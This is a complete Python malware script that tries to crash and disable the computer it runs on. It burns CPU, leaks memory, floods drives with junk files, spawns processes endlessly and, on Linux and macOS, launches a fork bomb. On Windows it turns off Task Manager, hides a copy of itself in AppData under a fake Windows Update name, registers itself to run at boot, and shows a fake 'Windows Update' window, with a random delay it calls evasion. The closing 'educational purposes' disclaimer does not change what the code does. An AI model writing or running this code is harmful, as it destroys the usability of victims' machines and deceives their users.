import os
import threading
import platform
import ctypes
import random
import time
import sys
import shutil

# Function Definitions
def cpu_burn():
    while True:
        pass  # 100% CPU usage

def memory_leak():
    leak = []
    while True:
        leak.append("X" * 10000000)  # 10MB per loop

def file_spam():
    while True:
        drive = random.choice(["C:", "D:", "E:", "F:"])  # Random disk selection
        file_path = os.path.join(drive, f"crash_{os.urandom(4).hex()}.txt")
        with open(file_path, "w") as f:
            f.write("X" * 10000000)  # 10MB per file

def infinite_process_spam():
    while True:
        if os.name == "nt":
            os.system("start cmd /c python -c \"while True: pass\"")  # Windows
        else:
            os.system("python3 -c 'while True: pass' &")  # Linux & macOS

# Fake Windows Update GUI
def fake_gui():
    import tkinter as tk
    root = tk.Tk()
    root.title("Windows Update")
    root.geometry("300x150")
    label = tk.Label(root, text="Windows Update\nPlease Wait...", font=("Arial", 14))
    label.pack(expand=True)
    root.after(5000, root.quit)  # Close GUI after 5 seconds
    root.mainloop()

# Task Manager Block (Windows)
def block_task_manager():
    os.system("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")

# Hidden Folder (Windows)
def hide_folder():
    appdata = os.getenv('APPDATA')
    hidden_folder = os.path.join(appdata, "WindowsUpdateManager")
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
    ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 2)  # Hide folder

# Auto-run on boot (Windows)
def auto_run():
    reg_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = "Windows Update Checker"
    reg_value = os.path.join(os.getenv("APPDATA"), "WindowsUpdateManager\\winupd.pyw")
    import winreg
    reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    reg_key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(reg_key, "WindowsUpdateChecker", 0, winreg.REG_SZ, reg_value)

    # Ensure the script itself is copied to the correct location
    target_path = os.path.join(os.getenv("APPDATA"), "WindowsUpdateManager", "winupd.pyw")
    if not os.path.exists(target_path):
        shutil.copyfile(sys.argv[0], target_path)

# Fork Bomb
def fork_bomb():
    while True:
        os.fork() 

# Evasion
def delayed_start():
    time.sleep(random.randint(10, 60))

# OS
def main():
    system = platform.system()

    if system == "Windows":
        print("Detected Windows: Running Windows-specific overload...")
        block_task_manager()
        hide_folder()
        auto_run()
        fake_gui()
        for _ in range(100): threading.Thread(target=cpu_burn, daemon=True).start()
        threading.Thread(target=memory_leak, daemon=True).start()
        threading.Thread(target=file_spam, daemon=True).start()
        threading.Thread(target=infinite_process_spam, daemon=True).start()

    elif system == "Linux":
        print("Detected Linux: Running Linux-specific overload...")
        fake_gui()
        for _ in range(100): threading.Thread(target=cpu_burn, daemon=True).start()
        threading.Thread(target=memory_leak, daemon=True).start()
        threading.Thread(target=file_spam, daemon=True).start()
        threading.Thread(target=infinite_process_spam, daemon=True).start()
        threading.Thread(target=fork_bomb, daemon=True).start()

    elif system == "Darwin":  # macOS
        print("Detected macOS: Running macOS-specific overload...")
        fake_gui()
        for _ in range(100): threading.Thread(target=cpu_burn, daemon=True).start()
        threading.Thread(target=memory_leak, daemon=True).start()
        threading.Thread(target=file_spam, daemon=True).start()
        threading.Thread(target=infinite_process_spam, daemon=True).start()
        threading.Thread(target=fork_bomb, daemon=True).start()

    else:
        print("Unsupported OS! Exiting...")

delayed_start()

# Execute main
main()

# This is for educational purposes only and I am not in charge for any misuse of this payload.
